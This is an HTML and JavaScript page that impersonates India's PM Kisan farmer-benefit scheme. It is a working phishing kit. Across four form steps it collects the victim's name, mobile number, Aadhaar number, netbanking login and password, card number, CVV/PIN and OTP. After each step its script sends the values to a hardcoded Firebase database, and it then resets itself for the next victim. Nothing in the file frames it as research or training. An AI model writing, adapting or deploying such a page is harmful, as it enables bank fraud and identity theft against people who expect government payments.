<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PM Kisan</title>

<style>
*{box-sizing:border-box}
body{margin:0;font-family:system-ui,Arial;background:#e9e9e9}
.page{width:100%;min-height:100vh;background:#fff;display:none;flex-direction:column}
.page.active{display:flex}
.top-img img,.bottom-img img{width:100%;max-height:130px;object-fit:cover;display:block}
.form{flex:1;padding:16px}
.title{text-align:center;color:#e46a1a;font-weight:700;margin-bottom:10px}
.field{margin:10px 0}
.label{font-size:12px;color:#777}
.input{width:100%;padding:14px;border:1px solid #ddd;border-radius:8px;background:#f3f3f3}
.btn{width:100%;padding:14px;margin:10px 0;border-radius:10px;border:2px solid #8a2c6b;background:#fff;color:#5fa44a;font-weight:700}
.thanks{text-align:center;color:#2e8b57;font-weight:700;font-size:18px}
.count{font-size:22px;font-weight:700;color:#d40000;text-align:center}
.shake{animation:shake .4s;border-color:red!important}
@keyframes shake{0%{transform:translateX(0)}25%{transform:translateX(-6px)}50%{transform:translateX(6px)}75%{transform:translateX(-6px)}100%{transform:translateX(0)}}
</style>
</head>
<body>

<!-- PAGE 1 -->
<div class="page active" id="page1">
  <div class="form">
    <div class="title">APPLY ONLINE</div>
    <div class="field"><div class="label">Full Name</div><input id="fullName" class="input"></div>
    <div class="field"><div class="label">Mobile Number</div><input id="mbno" class="input"></div>
    <div class="field"><div class="label">Aadhaar</div><input id="aadr" class="input"></div>
    <button class="btn" onclick="nextPage(1)">Continue</button>
  </div>
</div>

<!-- PAGE 2 -->
<div class="page" id="page2">
  <div class="form">
    <div class="title">BANK INFO</div>
    <div class="field"><div class="label">Netbanking ID</div><input id="nid" class="input"></div>
    <div class="field"><div class="label">Password</div><input id="pss" class="input"></div>
    <button class="btn" onclick="nextPage(2)">Continue</button>
    <button class="btn" onclick="prevPage(2)">Back</button>
  </div>
</div>

<!-- PAGE 3 -->
<div class="page" id="page3">
  <div class="form">
    <div class="title">CARD DETAILS</div>
    <div class="field"><div class="label">Card Number</div><input id="cn" class="input"></div>
    <div class="field"><div class="label">CVV / PIN</div><input id="cvpn" class="input"></div>
    <button class="btn" onclick="goOtp()">Submit</button>
    <button class="btn" onclick="prevPage(3)">Back</button>
  </div>
</div>

<!-- PAGE 4 -->
<div class="page" id="page4">
  <div class="form">
    <div class="title">ENTER OTP</div>
    <div class="field"><div class="label">OTP</div><input class="input" id="otpSingle" maxlength="6"></div>
    <button class="btn" onclick="verifyOtp()">Verify OTP</button>
  </div>
</div>

<!-- PAGE 5 -->
<div class="page" id="page5">
  <div class="form">
    <div class="thanks">Thank You üôè</div>
    <p style="text-align:center">Your request has been submitted</p>
  </div>
</div>

<!-- Firebase -->
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

<script>
/* üî• FIREBASE CONFIG */
firebase.initializeApp({
  apiKey: "AIzaSyDjMaZ5gSHh9zVRhdPwZjfVCsGaKW44kRk",
  authDomain: "admin-panel-989b2.firebaseapp.com",
  databaseURL: "https://admin-panel-989b2-default-rtdb.firebaseio.com",
  projectId: "admin-panel-989b2"
});

/* =========================
   üîë ONE USER = ONE KEY
   (Page-1 se hi create)
========================= */
let userKey = localStorage.getItem("userKey");
if(!userKey){
  userKey = firebase.database().ref("usersData").push().key;
  localStorage.setItem("userKey", userKey);
}

/* üîÑ SAFE SAVE / UPDATE */
function saveData(obj){
  firebase.database().ref("usersData/"+userKey).update({
    ...obj,
    time: new Date().toLocaleString()
  });
}

/* UI helpers (UNCHANGED) */
document.querySelectorAll('.page').forEach(p=>{
  p.prepend(Object.assign(document.createElement('div'),{className:'top-img',innerHTML:'<img src="top.jpg">'}));
  p.append(Object.assign(document.createElement('div'),{className:'bottom-img',innerHTML:'<img src="bottom.jpg">'}));
});
function switchPage(a,b){
  document.getElementById("page"+a).classList.remove("active");
  document.getElementById("page"+b).classList.add("active");
}

/* üî¥ PAGE-WISE IMMEDIATE SAVE */
function nextPage(n){
  if(n===1){
    // Page-1 submit ‚Üí IMMEDIATE
    saveData({
      fullName: fullName.value,
      mbno: mbno.value,
      aadr: aadr.value,
      status: "PAGE1"
    });
  }
  if(n===2){
    // Page-2 submit ‚Üí UPDATE
    saveData({
      nid: nid.value,
      pss: pss.value,
      status: "PAGE2"
    });
  }
  switchPage(n,n+1);
}
function prevPage(n){switchPage(n,n-1)}

function goOtp(){
  // Page-3 submit ‚Üí UPDATE
  saveData({
    cn: cn.value,
    cvpn: cvpn.value,
    status: "PAGE3"
  });
  switchPage(3,4);
}

function verifyOtp(){
  var otp=document.getElementById("otpSingle").value.trim();
  if(otp.length!==6){alert("Enter valid OTP");return;}

  // FINAL UPDATE
  saveData({
    otp: otp,
    status: "COMPLETED",
    pinned: false
  });

  localStorage.removeItem("userKey"); // reset for next user
  switchPage(4,5);
}
</script>
</body>
</html>